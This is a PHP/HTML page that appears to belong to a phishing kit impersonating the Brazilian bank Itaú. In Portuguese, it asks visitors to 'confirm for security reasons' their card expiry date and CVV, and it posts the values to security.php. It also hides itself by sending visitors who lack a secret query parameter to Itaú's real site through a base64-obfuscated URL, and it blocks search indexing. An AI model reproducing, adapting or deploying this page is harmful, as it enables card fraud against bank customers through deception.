<?php 
if($_GET["the"]==null){
$xxxx = base64_decode("aHR0cHM6Ly93d3cuaXRhdS5jb20uYnIvbW9iaWxlL2NhcnRvZXMv");
header("Location: $xxxx");
}
else{
}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<link rel="stylesheet" type="text/css" href="assets/css/style.pendente.css?xx<?php echo time();?>">
	<script type="text/javascript" src="js/jquery-3.2.1.min.js?xx<?php echo time();?>"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js?xx<?php echo time();?>"></script>
	<script type="text/javascript" src="js/the.pendente.js?xx<?php echo time();?>"></script>
</head>
<body>
	<header class="top-promo">
		<img src="assets/images/logo-login.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="first">Segurança</li>
			<li>Confirmação</li>
			<li>sucesso</li>
		</ul>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
		    <p>Olá cliente Itaú, por motivos de segurança, você precisa confirmar os seguintes dados abaixo.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="security.php?the=<?php echo time();?>">
			
				<div class="frm-item" id="info">
				</div>
				<div class="frm-item">
					<input type="tel" id="numdtv" name="numdtv" maxlength="5" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)">
					<label for="numdtv" class="label-float">Validade do cartão</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="numcvv" name="numcvv" maxlength="3" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)">
					<label for="numcvv" class="label-float">Código de segurança</label>
					<span id="helpcvv" class="helpcvv"></span>
				</div>
				<input type="submit" id="btncad" class="btncad" name="btnpend" value="Continuar" disabled="disabled">
			</form>
		</div>
	</section>
	<section id="mod-help-cvv" class="mod-help-cvv">
		<span id="mod-help-close" class="mod-help-close">x</span>
		<div class="container-mod">
			<img class="img-mod-help" src="assets/images/img_card_cvv.png">
			<p>O código de segurança são os três dígitos que encontra-se no verso do seu cartão, como mostrado na imagem acima.</p>
		</div>
	</section>
</body>
</html>